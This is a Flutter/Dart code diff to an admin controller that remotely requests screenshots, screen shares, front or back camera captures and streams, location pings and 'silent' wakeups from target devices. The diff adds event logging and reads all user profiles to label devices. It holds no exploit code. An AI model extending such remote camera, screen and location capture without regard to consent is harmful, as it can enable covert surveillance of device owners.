@@ -171,15 +171,35 @@ class ScreenshotRequestItem {
   }
 }
 
+class AdminEventLog {
+  final String id;
+  final DateTime timestamp;
+  final String eventType;
+  final String targetDevice;
+  final String status;
+  final String? details;
+
+  AdminEventLog({
+    required this.id,
+    required this.timestamp,
+    required this.eventType,
+    required this.targetDevice,
+    required this.status,
+    this.details,
+  });
+}
+
 class AdminController extends GetxController {
   final RxString currentDeviceId = ''.obs;
   final RxList<AdminDevice> devices = <AdminDevice>[].obs;
   final RxBool showOnlyNative = false.obs;
   final RxList<ScreenshotRequestItem> screenshotRequests =
       <ScreenshotRequestItem>[].obs;
+  final RxList<AdminEventLog> eventLogs = <AdminEventLog>[].obs;
   final RxBool isReady = false.obs;
 
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _devicesSubscription;
+  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _usersSubscription;
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
       _requestsSubscription;
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
@@ -188,9 +208,27 @@ class AdminController extends GetxController {
   StreamSubscription<dynamic>? _supabaseRequestsSubscription;
   StreamSubscription<dynamic>? _supabaseIncomingSubscription;
 
+  void logEvent(String eventType, String targetDeviceId, String status, {String? details}) {
+    final targetName = getDeviceDisplayName(targetDeviceId);
+    final log = AdminEventLog(
+      id: DateTime.now().millisecondsSinceEpoch.toString(),
+      timestamp: DateTime.now(),
+      eventType: eventType,
+      targetDevice: targetName,
+      status: status,
+      details: details,
+    );
+    eventLogs.insert(0, log);
+    if (eventLogs.length > 60) {
+      eventLogs.removeLast();
+    }
+  }
+
   Future<void> initialize() async {
     isReady.value = true;
+    _listenToUsers();
     _listenToDevices();
+    unawaited(refreshDeviceList());
 
     try {
       final devId = await AdminService.getOrCreateDeviceId();
@@ -212,6 +250,49 @@ class AdminController extends GetxController {
       }
     } catch (e) {
       debugPrint('Non-fatal AdminController background registration error: $e');
+    }
+  }
+
+  void _listenToUsers() {
+    _usersSubscription?.cancel();
+    try {
+      _usersSubscription = FirebaseFirestore.instance.collection('users').snapshots().listen(
+        (snapshot) {
+          for (final doc in snapshot.docs) {
+            final data = doc.data();
+            final uid = doc.id;
+            final name = data['displayName'] as String? ?? data['display_name'] as String? ?? data['email']?.split('@').first ?? '';
+            if (name.isNotEmpty) {
+              _resolvedUsernameCache['user_$uid'] = name;
+              _resolvedUsernameCache[uid] = name;
+            }
+          }
+          if (devices.isNotEmpty) {
+            _enrichDevicesWithUserProfiles();
+          }
+        },
+        onError: (e) => debugPrint('Error listening to users: $e'),
+      );
+    } catch (e) {
+      debugPrint('Error setting up users stream: $e');
+    }
+  }
+
+  void _enrichDevicesWithUserProfiles() {
+    bool updated = false;
+    final List<AdminDevice> currentList = List.from(devices);
+    for (int i = 0; i < currentList.length; i++) {
+      final dev = currentList[i];
+      final uid = dev.deviceId.replaceFirst('user_', '');
+      final cachedName = _resolvedUsernameCache[dev.deviceId] ?? _resolvedUsernameCache[uid];
+      if (cachedName != null && cachedName.isNotEmpty && (dev.username.startsWith('user_') || dev.username.isEmpty || dev.username == dev.deviceId)) {
+        currentList[i] = dev.copyWith(username: cachedName);
+        updated = true;
+      }
+    }
+    if (updated) {
+      devices.value = currentList;
+      devices.refresh();
     }
   }
 
@@ -451,8 +532,11 @@ class AdminController extends GetxController {
         await AdminService.fulfillCameraCaptureRequest(requestId);
       } else if (requestType == 'camera_stream') {
         await AdminService.fulfillScreenShareRequest(requestId);
-      } else {
+      } else if (requestType == 'screenshot') {
         await AdminService.fulfillScreenshotRequest(requestId);
+      } else if (requestType == 'location_ping' || requestType == 'wake_up') {
+        // Native background service handles location ping and silent wakeups
+        return;
       }
     } catch (e) {
       debugPrint('Error fulfilling request $requestId: $e');
@@ -464,15 +548,33 @@ class AdminController extends GetxController {
   }
 
   Future<void> refreshDeviceList() async {
-    final querySnapshot = await FirebaseFirestore.instance
-        .collection('devices')
-        .orderBy('lastSeenAt', descending: true)
-        .get();
-    devices.value = querySnapshot.docs.map(AdminDevice.fromSnapshot).toList();
+    try {
+      final usersSnapshot = await FirebaseFirestore.instance.collection('users').get();
+      for (final doc in usersSnapshot.docs) {
+        final data = doc.data();
+        final uid = doc.id;
+        final name = data['displayName'] as String? ?? data['display_name'] as String? ?? data['email']?.split('@').first;
+        if (name != null && name.isNotEmpty) {
+          _resolvedUsernameCache['user_$uid'] = name;
+          _resolvedUsernameCache[uid] = name;
+        }
+      }
+
+      final querySnapshot = await FirebaseFirestore.instance
+          .collection('devices')
+          .orderBy('lastSeenAt', descending: true)
+          .get();
+      _handleDeviceListUpdate(
+        querySnapshot.docs.map(AdminDevice.fromSnapshot).toList(),
+      );
+    } catch (e) {
+      debugPrint('Error in refreshDeviceList: $e');
+    }
   }
 
   Future<void> requestScreenshot(String targetDeviceId) async {
     if (targetDeviceId.isEmpty) return;
+    logEvent('Screenshot', targetDeviceId, 'Dispatched');
     await AdminService.sendScreenshotRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -481,6 +583,7 @@ class AdminController extends GetxController {
 
   Future<void> requestScreenShare(String targetDeviceId) async {
     if (targetDeviceId.isEmpty) return;
+    logEvent('Live Screen Share', targetDeviceId, 'Dispatched');
     await AdminService.sendScreenShareRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -492,6 +595,7 @@ class AdminController extends GetxController {
     required String cameraFacing,
   }) async {
     if (targetDeviceId.isEmpty) return;
+    logEvent('Camera Capture ($cameraFacing)', targetDeviceId, 'Dispatched');
     await AdminService.sendCameraCaptureRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -504,6 +608,7 @@ class AdminController extends GetxController {
     required String cameraFacing,
   }) async {
     if (targetDeviceId.isEmpty) return;
+    logEvent('Live Camera Stream ($cameraFacing)', targetDeviceId, 'Dispatched');
     await AdminService.sendCameraStreamRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -525,6 +630,7 @@ class AdminController extends GetxController {
         )
         .toList();
     for (final t in targets) {
+      logEvent('Batch Screenshot', t.deviceId, 'Dispatched');
       await AdminService.sendScreenshotRequest(
         t.deviceId,
         currentDeviceId.value,
@@ -540,6 +646,7 @@ class AdminController extends GetxController {
 
   Future<void> wakeDevice(String targetDeviceId) async {
     if (targetDeviceId.isEmpty) return;
+    logEvent('Silent Wake Signal', targetDeviceId, 'Dispatched');
     await AdminService.sendWakeRequest(
       targetDeviceId,
       currentDeviceId.value,
